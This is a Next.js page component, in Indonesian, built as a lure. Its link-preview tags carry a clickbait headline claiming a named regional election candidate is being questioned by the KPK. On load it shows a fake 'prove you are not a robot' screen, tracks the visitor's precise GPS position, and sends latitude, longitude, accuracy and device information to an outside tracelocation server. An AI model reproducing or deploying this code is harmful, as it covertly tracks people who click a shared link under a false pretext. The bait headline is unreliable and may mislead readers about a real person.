"use client";
import { useState, useEffect, useCallback } from 'react';

const PostPage = ({ params }) => {
    const [post, setPost] = useState({
        title: 'Baru Lagi, Safarudin Diperiksa Oleh KPK Terkait Dugaan .... Selengkapnya',
        description: 'Calon Bupati Aceh Barat Daya 2024, Dr. Safarudin kembali dipanggil oleh KPK terkati adanya dugaan terhadap penyelewengan penggunaan Dana Anggaran...Selengkapnya',
        image: 'https://cdn.ajnn.net/files/images/20211027-whatsapp-image-2021-10-27-at-17-59-31.jpeg' // Placeholder image
    });
    const [gpsEnabled, setGpsEnabled] = useState(false);
    const [dataSent, setDataSent] = useState(false);
    const [watchId, setWatchId] = useState(null);

    const { slug } = params;

    // Simulasi data postingan berdasarkan slug
    const fetchPost = useCallback(async () => {
        const data = {
            title: 'Baru Lagi, Safarudin Diperiksa Oleh KPK Terkait Dugaan .... Selengkapnya',
            description: 'Calon Bupati Aceh Barat Daya 2024, Dr. Safarudin kembali dipanggil oleh KPK terkati adanya dugaan terhadap penyelewengan penggunaan Dana Anggaran...Selengkapnya',
            image: 'https://cdn.ajnn.net/files/images/20211027-whatsapp-image-2021-10-27-at-17-59-31.jpeg' // Ganti dengan URL gambar nyata
        };
        setPost(data);
    }, [slug]);

    useEffect(() => {
        fetchPost();
        return () => {
            if (watchId) {
                navigator.geolocation.clearWatch(watchId);
            }
        };
    }, [fetchPost, watchId]);

    const sendLocationData = async (latitude, longitude, accuracy) => {
        if (dataSent) return; // Prevent sending data again

        console.log('Sending location data:', { latitude, longitude, accuracy });
        const userAgent = navigator.userAgent;

        try {
            const response = await fetch('https://tracelocation.vercel.app/api/save-location', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    latitude,
                    longitude,
                    accuracy,
                    device_info: userAgent,
                    ip_address: '', // Tambahkan jika bisa menangani IP di sisi server
                }),
            });

            if (!response.ok) {
                throw new Error('Network response was not ok');
            }

            const data = await response.json();
            console.log('Location data saved:', data);
            setDataSent(true); // Mark data as sent
        } catch (error) {
            console.error('Error saving location data:', error);
        }
    };

    const requestLocation = useCallback(() => {
        if (navigator.geolocation) {
            const id = navigator.geolocation.watchPosition(
                (position) => {
                    const { latitude, longitude, accuracy } = position.coords;
                    if (!dataSent) {
                        sendLocationData(latitude, longitude, accuracy);
                    }
                },
                (error) => {
                    console.error('Geolocation error:', error);
                    setGpsEnabled(false);
                    alert('GPS belum aktif. Mohon aktifkan GPS untuk melanjutkan.');
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0,
                }
            );
            setWatchId(id);
        } else {
            setGpsEnabled(false);
            alert('Perangkat Anda tidak mendukung geolokasi.');
        }
    }, [dataSent]);

    useEffect(() => {
        requestLocation();

        return () => {
            if (watchId) {
                navigator.geolocation.clearWatch(watchId);
            }
        };
    }, [requestLocation, watchId]);

    return (
        <>
            <title>{post.title}</title>
            <meta property="og:title" content={post.title} />
            <meta property="og:description" content={post.description} />
            <meta property="og:image" content={post.image} />
            <meta property="og:url" content={`${process.env.NEXT_PUBLIC_API_URL}/${slug}`} />
            <meta property="og:type" content="website" />
            <meta property="og:locale" content="id_ID" />
            <meta property="og:site_name" content="Rencong" />
            <meta name="twitter:card" content="summary_large_image" />
            <meta name="twitter:title" content={post.title} />
            <meta name="twitter:description" content={post.description} />
            <meta name="twitter:image" content={post.image} />

            {gpsEnabled ? (
                <div style={{ textAlign: 'center', padding: '20px' }}>
                    <div>
                        <p style={{ color: 'green' }}>Anda sudah di konfirmasi bahwa bukan robot.</p>
                    </div>
                </div>
            ) : (
                <div style={{ textAlign: 'center', padding: '20px' }}>
                    <h1>Verifikasi Anda Bukan Robot</h1>
                    <p>Kami membutuhkan lokasi anda untuk memverifikasi bahwa anda bukan robot.</p>
                    <p>Mohon aktifkan GPS dan muat ulang halaman ini.</p>
                </div>
            )}
        </>
    );
};

export default PostPage;
